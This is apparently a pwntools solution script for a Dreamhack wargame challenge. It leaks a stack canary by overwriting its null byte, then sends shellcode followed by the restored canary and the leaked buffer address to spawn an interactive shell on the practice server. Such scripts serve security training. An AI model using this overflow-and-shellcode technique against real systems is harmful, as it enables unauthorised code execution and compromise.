from pwn import *

r = remote('host3.dreamhack.games',21825)
context.arch = 'amd64'

r.recvuntil("buf: ")
buf = int(r.recvline()[:-1], 16)
#rcv1 = r.recvline()
#rcv2 = r.recvline()
#print(rcv1)
#print(rcv2)

rcv1 = r.recvuntil("Input: ")
#print(rcv1)

search_canary = b'\x90'*89
r.send(search_canary)

rcv2 = r.recvuntil("Your input is ")
rcv3 = r.recv(90)
canary = b'\x00'+r.recv(7)
print("AAAAAAAAAAAAAAAA")
#print(rcv2)
#print(rcv3)
#print(canary)

print(canary)
print(p64(u64(canary),endian='big'))
sh = asm(shellcraft.sh())

payload = sh.ljust(88,b'A')+ canary + b'B'*0x08 + p64(buf)

r.sendlineafter("Input:",payload)

r.interactive()



